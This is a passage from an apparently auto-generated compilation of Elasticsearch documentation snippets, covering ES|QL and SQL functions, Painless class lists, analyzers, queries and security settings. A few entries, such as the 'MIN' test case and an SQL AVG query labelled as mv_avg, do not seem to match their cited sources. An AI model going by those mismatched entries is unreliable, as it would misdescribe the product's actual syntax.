verification modes and cipher suites.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_19\n\nLANGUAGE: properties\nCODE:\n```\nssl.verification_mode=full|certificate|none\nssl.supported_protocols=TLSv1.3,TLSv1.2,TLSv1.1\nssl.cipher_suites=TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256\n```\n\n----------------------------------------\n\nTITLE: Defining MIN Function Test Case for Elasticsearch SQL\nDESCRIPTION: This code snippet defines a test case for the MIN function in Elasticsearch SQL. It specifies the function name, expected data types, and provides example queries to test the function's behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/min.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nMIN\n\nexpression\tNUMERIC, DATETIME, INTERVAL\nresult\tSAME\n\nMIN(1)\t=>\t1\nMIN(1.0)\t=>\t1.0\nMIN(null)\t=>\tnull\n\nMIN(CAST('2020-01-01' AS TIMESTAMP))\t=>\tCAST('2020-01-01' AS TIMESTAMP)\nMIN(CAST('1 year' AS INTERVAL YEAR))\t=>\tCAST('1 year' AS INTERVAL YEAR)\n\nSELECT MIN(emp_no) FROM test_emp\nSELECT department, MIN(salary) FROM test_emp GROUP BY department\n```\n\n----------------------------------------\n\nTITLE: ES|QL LIKE Operator Workaround with RLIKE Example\nDESCRIPTION: This example demonstrates a workaround for the limitations of the LIKE operator by using the RLIKE operator with a regular expression.  The regular expression allows for case-insensitive matching and partial string matching. The regular expression '[Ee]lasticsearch.*' will match any string starting with 'Elasticsearch' or 'elasticsearch'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_5\n\nLANGUAGE: esql\nCODE:\n```\n\n| WHERE field RLIKE \"[Ee]lasticsearch.*\"\n\n```\n\n----------------------------------------\n\nTITLE: Unsigned Long Script Document Values Class\nDESCRIPTION: Provides methods for retrieving long values from script document values, supporting unsigned long type operations in Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/mapper-unsigned-long/src/main/resources/org/elasticsearch/xpack/unsignedlong/org.elasticsearch.xpack.unsignedlong.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.xpack.unsignedlong.UnsignedLongScriptDocValues {\n  Long get(int)\n  long getValue()\n}\n```\n\n----------------------------------------\n\nTITLE: Offset Bucket Dates in ESQL\nDESCRIPTION: Shows how to adjust bucket start values by adding an offset to the dates before bucketing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_9\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS dates = MV_SORT(VALUES(birth_date)) BY b = BUCKET(birth_date + 1 HOUR, 1 YEAR) - 1 HOUR\n| EVAL d_count = MV_COUNT(dates)\n```\n\n----------------------------------------\n\nTITLE: Querying Flattened Fields in Elasticsearch\nDESCRIPTION: Examples of querying flattened fields using term queries, both for top-level field and specific keys using dot notation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST bug_reports/_search\n{\n  \"query\": {\n    \"term\": {\"labels\": \"urgent\"}\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPOST bug_reports/_search\n{\n  \"query\": {\n    \"term\": {\"labels.release\": \"v1.3.0\"}\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting String to Version Type in ESQL\nDESCRIPTION: Demonstrates using the TO_VERSION function to convert a string representation of a version number (\"1.2.3\") into a version type. The result is stored in variable 'v' and displayed in a tabular format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_version.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW v = TO_VERSION(\"1.2.3\")\n```\n\n----------------------------------------\n\nTITLE: ORDER BY with Aggregation\nDESCRIPTION: Demonstrates ordering groups based on aggregate function results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_27\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g, MIN(salary) AS salary FROM emp GROUP BY gender ORDER BY salary DESC;\n```\n\n----------------------------------------\n\nTITLE: Enabling Track Commit Timestamp in PostgreSQL\nDESCRIPTION: This shell command enables the recording of the commit time of PostgreSQL transactions to ensure data is indexed correctly. Running this command requires superuser privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-postgresql-connector-client-tutorial.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nALTER SYSTEM SET track_commit_timestamp = on;\n\n```\n\n----------------------------------------\n\nTITLE: Defining ZoneRulesProvider Class Methods\nDESCRIPTION: Specifies the structure and methods of the ZoneRulesProvider class for providing access to time zone rules. Includes methods for getting available zone IDs and rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.zone.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.zone.ZoneRulesProvider {\n  Set getAvailableZoneIds()\n  ZoneRules getRules(String,boolean)\n  NavigableMap getVersions(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Median of Multivalued Field using MV_MEDIAN in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the MV_MEDIAN function in ESQL. It takes a multivalued field 'a' containing an array of numbers and calculates the median value, storing the result in a new field 'median_a'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_median.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[3, 5, 1]\n| EVAL median_a = MV_MEDIAN(a)\n```\n\n----------------------------------------\n\nTITLE: Executing Functional Tests\nDESCRIPTION: This snippet provides the command to execute a functional test for the Amazon S3 self-managed connector. The command invokes the 'make ftest' operation with the specified connector name and optional data size parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=s3\n```\n\n----------------------------------------\n\nTITLE: Indexing GeoJSON MultiLineString in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON MultiLineString type in Elasticsearch. The example shows a document with a 'location' field containing multiple linestrings, each defined by an array of coordinate pairs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_12\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"multilinestring\",\n    \"coordinates\" : [\n      [ [1002.0, 200.0], [1003.0, 200.0], [1003.0, 300.0], [1002.0, 300.0] ],\n      [ [1000.0, 100.0], [1001.0, 100.0], [1001.0, 100.0], [1000.0, 100.0] ],\n      [ [1000.2, 100.2], [1000.8, 100.2], [1000.8, 100.8], [1000.2, 100.8] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ZoneOffset Methods and Fields\nDESCRIPTION: Lists the methods and fields available in the java.time.ZoneOffset class. It focuses on creating and retrieving ZoneOffset instances, including functionalities for converting to total seconds and representing offsets with hours, minutes, and seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_17\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.ZoneOffset {\n  ZoneOffset MAX\n  ZoneOffset MIN\n  ZoneOffset UTC\n  ZoneOffset from(TemporalAccessor)\n  int getTotalSeconds()\n  ZoneOffset of(String)\n  ZoneOffset ofHours(int)\n  ZoneOffset ofHoursMinutes(int,int)\n  ZoneOffset ofHoursMinutesSeconds(int,int,int)\n  ZoneOffset ofTotalSeconds(int)\n}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple HTTP Exporters with Different Host Formats\nDESCRIPTION: Examples of configuring multiple HTTP exporters with various host format options, including single hosts, arrays, and different protocols.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/monitoring-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.monitoring.exporters:\n  example1:\n    type: http\n    host: \"10.1.2.3\"\n  example2:\n    type: http\n    host: [\"http://10.1.2.4\"]\n  example3:\n    type: http\n    host: [\"10.1.2.5\", \"10.1.2.6\"]\n  example4:\n    type: http\n    host: [\"https://10.1.2.3:9200\"]\n```\n\n----------------------------------------\n\nTITLE: Implementing Basque Analyzer as Custom Analyzer in Elasticsearch\nDESCRIPTION: Creates a custom analyzer that replicates the functionality of the built-in Basque analyzer, demonstrating the configuration of Basque-specific stopwords, keyword marking for stem exclusion, and stemming filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /basque_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"basque_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_basque_\" \n        },\n        \"basque_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"Adibidez\"] \n        },\n        \"basque_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"basque\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_basque\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"basque_stop\",\n            \"basque_keywords\",\n            \"basque_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring JLH Score in Elasticsearch\nDESCRIPTION: Implementation example of using JLH score as a significance measure in significant terms aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n\"jlh\": {\n}\n```\n\n----------------------------------------\n\nTITLE: Using Phrase Suggest with Multiple Generators in Elasticsearch\nDESCRIPTION: Example of a phrase suggester API call with two direct generators: one using a standard field and another using a reversed field to overcome prefix limitations. The example demonstrates how to use pre_filter and post_filter with reverse analyzers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nPOST test/_search\n{\n  \"suggest\": {\n    \"text\" : \"obel prize\",\n    \"simple_phrase\" : {\n      \"phrase\" : {\n        \"field\" : \"title.trigram\",\n        \"size\" : 1,\n        \"direct_generator\" : [ {\n          \"field\" : \"title.trigram\",\n          \"suggest_mode\" : \"always\"\n        }, {\n          \"field\" : \"title.reverse\",\n          \"suggest_mode\" : \"always\",\n          \"pre_filter\" : \"reverse\",\n          \"post_filter\" : \"reverse\"\n        } ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Cluster Routing Allocation in Elasticsearch YAML\nDESCRIPTION: This YAML snippet shows the cluster.routing.allocation.enable setting, which controls shard allocation for different types of shards. It can be set to 'all', 'primaries', 'new_primaries', or 'none'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.enable\n```\n\n----------------------------------------\n\nTITLE: Creating Danish Custom Analyzer in Elasticsearch\nDESCRIPTION: This code snippet shows how to define a custom analyzer for the Danish language. It incorporates stop words, keyword significance, and stemming to enhance text processing and indexing. The analyzer allows customization of stop words specified in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPUT /danish_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"danish_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_danish_\" <1>\n        },\n        \"danish_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"eksempel\"] <2>\n        },\n        \"danish_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"danish\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_danish\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"danish_stop\",\n            \"danish_keywords\",\n            \"danish_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This markdown table shows the supported types for different field and inlist combinations in Elasticsearch, along with their resulting types. It includes various data types such as boolean, numeric, geometric, and text-based fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/not in.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | inlist | result |\n| --- | --- | --- |\n| boolean | boolean | boolean |\n| cartesian_point | cartesian_point | boolean |\n| cartesian_shape | cartesian_shape | boolean |\n| double | double | boolean |\n| geo_point | geo_point | boolean |\n| geo_shape | geo_shape | boolean |\n| integer | integer | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Defining Instant Class\nDESCRIPTION: This code snippet defines the `java.time.Instant` class, showing its fields (EPOCH, MAX, MIN) and methods.  These methods include conversions to other date/time types, comparisons, arithmetic operations for adding/subtracting durations, and creating Instant instances from epoch seconds/milliseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_4\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.Instant {\\n  Instant EPOCH\\n  Instant MAX\\n  Instant MIN\\n  OffsetDateTime atOffset(ZoneOffset)\\n  ZonedDateTime atZone(ZoneId)\\n  int compareTo(Instant)\\n  Instant from(TemporalAccessor)\\n  long getEpochSecond()\\n  int getNano()\\n  boolean isAfter(Instant)\\n  boolean isBefore(Instant)\\n  Instant minus(TemporalAmount)\\n  Instant minus(long,TemporalUnit)\\n  Instant minusMillis(long)\\n  Instant minusNanos(long)\\n  Instant minusSeconds(long)\\n  Instant ofEpochSecond(long)\\n  Instant ofEpochSecond(long,long)\\n  Instant ofEpochMilli(long)\\n  Instant parse(CharSequence)\\n  Instant plus(TemporalAmount)\\n  Instant plus(long,TemporalUnit)\\n  Instant plusMillis(long)\\n  Instant plusNanos(long)\\n  Instant plusSeconds(long)\\n  long toEpochMilli()\\n  Instant truncatedTo(TemporalUnit)\\n  Instant with(TemporalAdjuster)\\n  Instant with(TemporalField,long)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Index-based Audit Event Ignore Policy in Elasticsearch YAML\nDESCRIPTION: This setting defines a list of index names or wildcards for which audit events will not be printed. It only applies if all indices in the event are covered by the policy. It is a dynamic cluster setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/auding-settings.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.audit.logfile.events.ignore_filters.<policy_name>.indices\n```\n\n----------------------------------------\n\nTITLE: Executing Disjunction Max Query in Elasticsearch using Console\nDESCRIPTION: This snippet demonstrates a Disjunction Max Query request in Elasticsearch. It uses the `_search` endpoint to execute queries that match either titles or body fields with 'Quick pets', adjusting relevance scores with a tie breaker. The query requires a list of subqueries, each encapsulated within a `term` query object. Optional parameters such as `tie_breaker` can modify the relevance scoring to benefit documents matching multiple query clauses. Inputs include an endpoint and a JSON query object, while outputs are the matching documents with scores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-dis-max-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"dis_max\": {\n      \"queries\": [\n        { \"term\": { \"title\": \"Quick pets\" } },\n        { \"term\": { \"body\": \"Quick pets\" } }\n      ],\n      \"tie_breaker\": 0.7\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Comment Header\nDESCRIPTION: Generated comment indicating this is an auto-generated test file for ESQL's AbstractFunctionTestCase with instructions not to edit directly\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/top.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Using Regular Expressions with Match Operator in Painless\nDESCRIPTION: Updates hockey players whose last names start with a consonant and end with a vowel using the match operator (==~).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update_by_query\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"\"\"\n      if (ctx._source.last ==~ /[^aeiou].*[aeiou]/) {\n        ctx._source.last += \"matched\";\n      } else {\n        ctx.op = \"noop\";\n      }\n    \"\"\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Redis Connector Configuration File with curl\nDESCRIPTION: Command to download the sample configuration file for the Redis connector using curl. The file is saved to the ~/connectors-config/ directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Copyright Notice Template\nDESCRIPTION: Boilerplate copyright notice text to be included when applying the Apache License 2.0 to software works. The template includes placeholders for year and copyright owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-html-module-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Basic Rank Evaluation Request Structure in Elasticsearch\nDESCRIPTION: Shows the basic structure of a rank evaluation request with sections for requests and metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [ ... ],                            \n  \"metric\": {                                     \n    \"mean_reciprocal_rank\": { ... }               \n  }\n}\n```\n\n----------------------------------------\n\nTITLE: End-to-End Testing for Google Drive Connector\nDESCRIPTION: This snippet provides shell commands for functional end-to-end testing of the Google Drive connector using a Makefile target. It requires setting up a test environment with access to Google Drive. The command runs functional tests against the Google Drive data source. Add the 'DATA_SIZE=small' flag for faster tests focused on smaller datasets. The output of the tests provides confirmation of connector functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-drive.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=google_drive\n```\n\nLANGUAGE: shell\nCODE:\n```\nmake ftest NAME=google_drive DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: Standard Deviation Calculation in Elasticsearch Aggregations\nDESCRIPTION: Example of using the stdDev function in a moving function aggregation to calculate standard deviation over a window of values. Uses date histogram with monthly intervals and combines with sum aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_moving_sum\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.stdDev(values, MovingFunctions.unweightedAvg(values))\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Functions with Exact Match Pattern in Elasticsearch SQL\nDESCRIPTION: Example of using SHOW FUNCTIONS with LIKE clause to find an exact function name match.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-functions.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSHOW FUNCTIONS LIKE 'ABS';\n\n     name      |     type\n---------------+---------------\nABS            |SCALAR\n```\n\n----------------------------------------\n\nTITLE: Using Simple Fragmenter with Plain Highlighter\nDESCRIPTION: This example shows how to use the 'simple' fragmenter with the 'plain' highlighter type in an Elasticsearch search query, setting fragment size to 15 and limiting to 3 fragments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_25\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"match_phrase\": { \"message\": \"number 1\" }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"message\": {\n        \"type\": \"plain\",\n        \"fragment_size\": 15,\n        \"number_of_fragments\": 3,\n        \"fragmenter\": \"simple\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Java Byte Class\nDESCRIPTION: This snippet defines the Byte class in Java that serves as the wrapper for the byte primitive type. It includes methods for comparison, parsing byte values from strings, and converting byte values to their integer or long counterparts. The class provides constants like MAX_VALUE and MIN_VALUE for easy reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Byte {\n  int BYTES\n  byte MAX_VALUE\n  byte MIN_VALUE\n  int SIZE\n  int compare(byte,byte)\n  int compareTo(Byte)\n  Byte decode(String)\n  int hashCode(byte)\n  byte parseByte(String)\n  byte parseByte(String,int)\n  String toString(byte)\n  int toUnsignedInt(byte)\n  long toUnsignedLong(byte)\n  Byte valueOf(byte)\n  Byte valueOf(String,int)\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_DIFF Example: Difference in Minutes (Date vs. DateTime)\nDESCRIPTION: Shows the usage of DATE_DIFF with a date and a datetime value to calculate the difference in minutes. This illustrates how to compute the difference between a date and a full datetime.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_34\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_DIFF('minutes', '2019-09-04'::date, '2015-08-17T22:33:11.567Z'::datetime) AS \\\"diffInMinutes\\\";\\n\\n      diffInMinutes\n------------------------\n-2128407\"\n```\n\n----------------------------------------\n\nTITLE: Response from uploading extension file in Elasticsearch Service\nDESCRIPTION: Sample JSON response after successfully uploading an extension file, containing the extension details including ID, URL, version, type, and name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"url\": \"repo://2286113333\",\n    \"version\": \"8.4.3\",\n    \"extension_type\": \"plugin\",\n    \"id\": \"2286113333\",\n    \"name\": \"custom-plugin\"\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Content-Type Header for REST API Compatibility\nDESCRIPTION: Example of the Content-Type header required when making requests with a body while enabling REST API compatibility with Elasticsearch version 7.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nContent-Type: \"application/vnd.elasticsearch+json;compatible-with=7\"\n```\n\n----------------------------------------\n\nTITLE: User Cache Hashing Algorithms Configuration\nDESCRIPTION: Settings for cache.hash_algo realm configuration that specify how user credentials are hashed in memory. Options range from basic MD5 to advanced PBKDF2 with various iteration counts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_51\n\nLANGUAGE: yaml\nCODE:\n```\ncache.hash_algo: ssha256|md5|sha1|bcrypt|bcrypt4|bcrypt5|bcrypt6|bcrypt7|bcrypt8|bcrypt9|pbkdf2|pbkdf2_1000|pbkdf2_10000|pbkdf2_50000|pbkdf2_100000|pbkdf2_500000|pbkdf2_1000000|pbkdf2_stretch|pbkdf2_stretch_1000|pbkdf2_stretch_10000|pbkdf2_stretch_50000|pbkdf2_stretch_100000|pbkdf2_stretch_500000|pbkdf2_stretch_1000000|noop|clear_text\n```\n\n----------------------------------------\n\nTITLE: Describing Sign Function Behavior in ESQL\nDESCRIPTION: This snippet describes the behavior of the sign function in ESQL. It explains that the function returns -1 for negative numbers, 0 for zero, and 1 for positive numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/signum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nReturns the sign of the given number. It returns `-1` for negative numbers, `0` for `0` and `1` for positive numbers.\n```\n\n----------------------------------------\n\nTITLE: Pattern Replace Character Filter in Elasticsearch\nDESCRIPTION: Replaces characters matching a specific regular expression with a designated replacement during text analysis\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/character-filter-reference.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n`pattern_replace` character filter replaces any characters matching a regular expression with the specified replacement\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Update Query for Old Documents\nDESCRIPTION: Elasticsearch query to remove content from drive items older than 180 days while preserving metadata\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST INDEX_NAME/_update_by_query?conflicts=proceed\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": [\n        {\n          \"match\": {\n            \"object_type\": \"drive_item\"\n          }\n        },\n        {\n          \"exists\": {\n            \"field\": \"file\"\n          }\n        },\n        {\n          \"range\": {\n            \"lastModifiedDateTime\": {\n              \"lte\": \"now-180d\"\n            }\n          }\n        }\n      ]\n    }\n  },\n  \"script\": {\n    \"source\": \"ctx._source.body = ''\",\n    \"lang\": \"painless\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monitor Transform Privilege\nDESCRIPTION: Read-only access for transform operations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/security-privileges.md#2025-04-21_snippet_6\n\nLANGUAGE: markdown\nCODE:\n```\nmonitor_transform\n```\n\n----------------------------------------\n\nTITLE: Indexing a Shape in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to index a document with a `shape` field in Elasticsearch. It uses the `point` type with `coordinates` to represent a geographical point. The `refresh=wait_for` parameter ensures the document is immediately searchable.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-shape-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /example/_doc/1?refresh=wait_for\n{\n  \"name\": \"Lucky Landing\",\n  \"geometry\": {\n    \"type\": \"point\",\n    \"coordinates\": [ 1355.400544, 5255.530286 ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Illustrating Valid Numeric Type Casts in Painless\nDESCRIPTION: Examples of valid numeric type casts in Painless, demonstrating implicit and explicit casts between different numeric types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nint a = 1;            \nlong b = a;           \nshort c = (short)b;   \ndouble e = (double)a; \n```\n\n----------------------------------------\n\nTITLE: Indexing WKT Circle with Circle Processor\nDESCRIPTION: This example shows how to index a document containing a circle defined in Well-Known Text (WKT) format and retrieve the resulting polygon. The circle processor automatically converts the WKT circle to a WKT polygon representation based on the error distance configured in the pipeline.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-circle-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT circles/_doc/1?pipeline=polygonize_circles\n{\n  \"circle\": \"CIRCLE (30 10 40)\"\n}\n\nGET circles/_doc/1\n```\n\n----------------------------------------\n\nTITLE: Calculating Average in ESQL\nDESCRIPTION: This SQL query demonstrates the usage of the ESQL Average function. It calculates the average value of a field named 'a' and aliases the result as 'avg'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT AVG(a) AS avg FROM test\n```\n\n----------------------------------------\n\nTITLE: Generating RSA 